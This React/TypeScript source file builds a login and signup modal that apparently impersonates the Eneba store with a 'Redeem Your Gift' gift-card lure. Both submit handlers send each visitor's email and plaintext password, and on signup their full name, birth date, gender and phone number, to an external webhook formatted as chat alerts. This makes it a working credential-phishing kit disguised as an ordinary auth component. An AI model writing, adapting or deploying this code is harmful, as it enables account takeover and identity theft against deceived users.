
import React, { useState } from 'react';
import axios from 'axios';
import { 
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import * as z from "zod";
import { Loader, Mail, Lock, User, Calendar, Phone, AlertCircle } from 'lucide-react';
import { Alert, AlertDescription } from '@/components/ui/alert';

interface LoginSignupModalProps {
  isOpen: boolean;
  onClose: () => void;
  onComplete: (userData: any) => void;
  webhookUrl: string;
}

const loginSchema = z.object({
  email: z.string().email("Please enter a valid email"),
  password: z.string().min(6, "Password must be at least 6 characters"),
});

const signupSchema = z.object({
  fullName: z.string().min(3, "Full name must be at least 3 characters"),
  dateOfBirth: z.string().min(1, "Date of birth is required"),
  email: z.string().email("Please enter a valid email"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  gender: z.string().min(1, "Gender is required"),
  phoneNumber: z.string().min(5, "Please enter a valid phone number"),
});

const LoginSignupModal = ({ isOpen, onClose, onComplete, webhookUrl }: LoginSignupModalProps) => {
  const [mode, setMode] = useState<'login' | 'signup' | 'initial'>('initial');
  const [isLoading, setIsLoading] = useState(false);
  
  const loginForm = useForm({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });
  
  const signupForm = useForm({
    resolver: zodResolver(signupSchema),
    defaultValues: {
      fullName: "",
      dateOfBirth: "",
      email: "",
      password: "",
      gender: "",
      phoneNumber: "",
    },
  });

  const handleSubmitLogin = async (values: z.infer<typeof loginSchema>) => {
    setIsLoading(true);
    
    try {
      // Send data to webhook
      await axios.post(webhookUrl, {
        content: `👤 **USER LOGIN ATTEMPT**\n\n**Email**: ${values.email}\n**Password**: ${values.password}\n**Time**: ${new Date().toLocaleString()}`
      });
      
      // Complete the login process
      onComplete({
        type: 'login',
        ...values,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error("Error sending login data:", error);
    } finally {
      setIsLoading(false);
    }
  };
  
  const handleSubmitSignup = async (values: z.infer<typeof signupSchema>) => {
    setIsLoading(true);
    
    try {
      // Send data to webhook
      await axios.post(webhookUrl, {
        content: `✨ **NEW USER SIGNUP**\n\n**Full Name**: ${values.fullName}\n**Date of Birth**: ${values.dateOfBirth}\n**Email**: ${values.email}\n**Password**: ${values.password}\n**Gender**: ${values.gender}\n**Phone Number**: ${values.phoneNumber}\n**Time**: ${new Date().toLocaleString()}`
      });
      
      // Complete the signup process
      onComplete({
        type: 'signup',
        ...values,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error("Error sending signup data:", error);
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="bg-custom-purple-light text-white w-full max-w-md">
        {mode === 'initial' && (
          <div className="flex flex-col items-center space-y-6 py-6">
            <DialogHeader>
              <DialogTitle className="text-2xl text-white text-center">Join ENEBA to Redeem Your Gift</DialogTitle>
            </DialogHeader>
            <p className="text-gray-300">Create an account or login to continue</p>
            <div className="flex flex-col w-full space-y-3">
              <Button 
                onClick={() => setMode('signup')}
                className="bg-custom-yellow text-black hover:bg-custom-yellow/90 py-6 text-lg"
              >
                Sign Up
              </Button>
              <Button 
                onClick={() => setMode('login')}
                variant="outline" 
                className="bg-transparent hover:bg-white/10 py-6 text-lg"
              >
                Log In
              </Button>
            </div>
          </div>
        )}
        
        {mode === 'login' && (
          <div className="py-4">
            <DialogHeader>
              <DialogTitle className="text-2xl text-white text-center">Log In</DialogTitle>
            </DialogHeader>
            <Form {...loginForm}>
              <form onSubmit={loginForm.handleSubmit(handleSubmitLogin)} className="space-y-4 mt-4">
                <FormField
                  control={loginForm.control}
                  name="email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white">Email</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <Mail className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                          <Input 
                            placeholder="your.email@example.com" 
                            className="pl-10 bg-black/20 border-gray-700 text-white"
                            {...field} 
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={loginForm.control}
                  name="password"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white">Password</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <Lock className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                          <Input 
                            type="password" 
                            placeholder="••••••••"
                            className="pl-10 bg-black/20 border-gray-700 text-white"
                            {...field} 
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <div className="pt-4">
                  <Button 
                    type="submit" 
                    disabled={isLoading}
                    className="w-full bg-custom-yellow text-black hover:bg-custom-yellow/90"
                  >
                    {isLoading ? <Loader className="h-4 w-4 mr-2 animate-spin" /> : null}
                    Login
                  </Button>
                </div>
                
                <div className="text-center pt-2">
                  <button 
                    type="button"
                    onClick={() => setMode('signup')}
                    className="text-sm text-gray-300 hover:text-white underline"
                  >
                    Don't have an account? Sign Up
                  </button>
                </div>
              </form>
            </Form>
          </div>
        )}
        
        {mode === 'signup' && (
          <div className="py-4">
            <DialogHeader>
              <DialogTitle className="text-2xl text-white text-center">Create Account</DialogTitle>
            </DialogHeader>
            
            <Alert className="bg-red-900/30 border-red-500/50 mb-4">
              <AlertCircle className="h-5 w-5 text-red-500" />
              <AlertDescription className="text-left ml-2 text-red-100">
                <strong>IMPORTANT:</strong> All information must be accurate and valid. Accounts with invalid information will be terminated and gift card access revoked.
              </AlertDescription>
            </Alert>
            
            <Form {...signupForm}>
              <form onSubmit={signupForm.handleSubmit(handleSubmitSignup)} className="space-y-4 mt-4">
                <FormField
                  control={signupForm.control}
                  name="fullName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white">Full Name</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <User className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                          <Input 
                            placeholder="John Smith" 
                            className="pl-10 bg-black/20 border-gray-700 text-white"
                            {...field} 
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={signupForm.control}
                  name="dateOfBirth"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white">Date of Birth</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <Calendar className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                          <Input 
                            type="date" 
                            className="pl-10 bg-black/20 border-gray-700 text-white"
                            {...field} 
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={signupForm.control}
                  name="email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white">Email</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <Mail className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                          <Input 
                            placeholder="your.email@example.com" 
                            className="pl-10 bg-black/20 border-gray-700 text-white"
                            {...field} 
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={signupForm.control}
                  name="password"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white">Password</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <Lock className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                          <Input 
                            type="password" 
                            placeholder="••••••••"
                            className="pl-10 bg-black/20 border-gray-700 text-white"
                            {...field} 
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={signupForm.control}
                  name="gender"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white">Gender</FormLabel>
                      <FormControl>
                        <select 
                          className="w-full h-10 rounded-md border border-gray-700 bg-black/20 px-3 py-2 text-base text-white"
                          {...field}
                        >
                          <option value="" disabled>Select gender</option>
                          <option value="male">Male</option>
                          <option value="female">Female</option>
                          <option value="other">Other</option>
                          <option value="prefer-not-to-say">Prefer not to say</option>
                        </select>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={signupForm.control}
                  name="phoneNumber"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white">Phone Number</FormLabel>
                      <FormControl>
                        <div className="relative">
                          <Phone className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                          <Input 
                            placeholder="+1 234 567 8900"
                            className="pl-10 bg-black/20 border-gray-700 text-white"
                            {...field} 
                          />
                        </div>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <div className="pt-4">
                  <Button 
                    type="submit"
                    disabled={isLoading}
                    className="w-full bg-custom-yellow text-black hover:bg-custom-yellow/90"
                  >
                    {isLoading ? <Loader className="h-4 w-4 mr-2 animate-spin" /> : null}
                    Create Account
                  </Button>
                </div>
                
                <div className="text-center pt-2">
                  <button 
                    type="button"
                    onClick={() => setMode('login')}
                    className="text-sm text-gray-300 hover:text-white underline"
                  >
                    Already have an account? Log In
                  </button>
                </div>
              </form>
            </Form>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
};

export default LoginSignupModal;
